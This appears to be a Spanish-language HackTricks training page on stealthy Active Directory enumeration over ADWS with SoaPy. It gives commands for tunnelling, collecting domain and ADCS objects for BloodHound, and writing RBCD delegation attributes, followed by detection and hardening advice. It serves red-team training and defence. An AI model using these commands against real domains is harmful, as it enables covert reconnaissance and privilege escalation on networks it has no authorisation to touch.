# Enumeración de Servicios Web de Active Directory (ADWS) y Recolección Sigilosa

{{#include ../../banners/hacktricks-training.md}}

## ¿Qué es ADWS?

Los Servicios Web de Active Directory (ADWS) están **habilitados por defecto en cada Controlador de Dominio desde Windows Server 2008 R2** y escuchan en TCP **9389**. A pesar del nombre, **no se involucra HTTP**. En su lugar, el servicio expone datos al estilo LDAP a través de una pila de protocolos de enmarcado .NET propietarios:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Debido a que el tráfico está encapsulado dentro de estos marcos SOAP binarios y viaja por un puerto poco común, **la enumeración a través de ADWS es mucho menos probable que sea inspeccionada, filtrada o firmada que el tráfico clásico de LDAP/389 y 636**. Para los operadores, esto significa:

* Reconocimiento más sigiloso – Los equipos azules a menudo se concentran en consultas LDAP.
* Libertad para recolectar de **hosts no Windows (Linux, macOS)** mediante el túnel 9389/TCP a través de un proxy SOCKS.
* Los mismos datos que obtendrías a través de LDAP (usuarios, grupos, ACLs, esquema, etc.) y la capacidad de realizar **escrituras** (por ejemplo, `msDs-AllowedToActOnBehalfOfOtherIdentity` para **RBCD**).

> NOTA: ADWS también es utilizado por muchas herramientas GUI/PowerShell de RSAT, por lo que el tráfico puede mezclarse con la actividad administrativa legítima.

## SoaPy – Cliente Nativo de Python

[SoaPy](https://github.com/logangoins/soapy) es una **reimplementación completa de la pila de protocolos ADWS en Python puro**. Crea los marcos NBFX/NBFSE/NNS/NMF byte por byte, permitiendo la recolección desde sistemas similares a Unix sin tocar el tiempo de ejecución de .NET.

### Características Clave

* Soporta **proxy a través de SOCKS** (útil desde implantes C2).
* Filtros de búsqueda de grano fino idénticos a LDAP `-q '(objectClass=user)'`.
* Operaciones de **escritura** opcionales ( `--set` / `--delete` ).
* Modo de salida **BOFHound** para ingestión directa en BloodHound.
* Opción `--parse` para embellecer marcas de tiempo / `userAccountControl` cuando se requiere legibilidad humana.

### Instalación (host del operador)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## Flujo de trabajo de recopilación sigilosa de AD

El siguiente flujo de trabajo muestra cómo enumerar **objetos de dominio y ADCS** a través de ADWS, convertirlos a JSON de BloodHound y buscar rutas de ataque basadas en certificados, todo desde Linux:

1. **Túnel 9389/TCP** desde la red objetivo a tu máquina (por ejemplo, a través de Chisel, Meterpreter, reenvío de puerto dinámico SSH, etc.). Exporta `export HTTPS_PROXY=socks5://127.0.0.1:1080` o utiliza `--proxyHost/--proxyPort` de SoaPy.

2. **Recopilar el objeto de dominio raíz:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Recopilar objetos relacionados con ADCS de la NC de Configuración:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Convertir a BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Sube el ZIP** en la interfaz de BloodHound y ejecuta consultas cypher como `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` para revelar rutas de escalación de certificados (ESC1, ESC8, etc.).

### Escribiendo `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Combina esto con `s4u2proxy`/`Rubeus /getticket` para una cadena completa de **Delegación Constrainida Basada en Recursos**.

## Detección y Fortalecimiento

### Registro Verboso de ADDS

Habilita las siguientes claves de registro en los Controladores de Dominio para mostrar búsquedas costosas / ineficientes provenientes de ADWS (y LDAP):
```powershell
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics' -Name '15 Field Engineering' -Value 5 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Expensive Search Results Threshold' -Value 1 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Search Time Threshold (msecs)' -Value 0 -Type DWORD
```
Los eventos aparecerán bajo **Directory-Service** con el filtro LDAP completo, incluso cuando la consulta llegó a través de ADWS.

### Objetos SACL Canary

1. Crea un objeto ficticio (por ejemplo, un usuario deshabilitado `CanaryUser`).
2. Agrega un **Audit** ACE para el principal _Everyone_, auditado en **ReadProperty**.
3. Siempre que un atacante realice `(servicePrincipalName=*)`, `(objectClass=user)`, etc., el DC emite **Event 4662** que contiene el SID real del usuario, incluso cuando la solicitud es proxy o se origina desde ADWS.

Ejemplo de regla predefinida de Elastic:
```kql
(event.code:4662 and not user.id:"S-1-5-18") and winlog.event_data.AccessMask:"0x10"
```
## Resumen de Herramientas

| Propósito | Herramienta | Notas |
|-----------|-------------|-------|
| Enumeración de ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, lectura/escritura |
| Ingesta de BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Convierte registros de SoaPy/ldapsearch |
| Compromiso de Cert | [Certipy](https://github.com/ly4k/Certipy) | Puede ser proxy a través del mismo SOCKS |

## Referencias

* [SpecterOps – Asegúrate de usar SOAP(y) – Una guía para operadores sobre la recolección sigilosa de AD usando ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – Especificaciones MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)

{{#include ../../banners/hacktricks-training.md}}
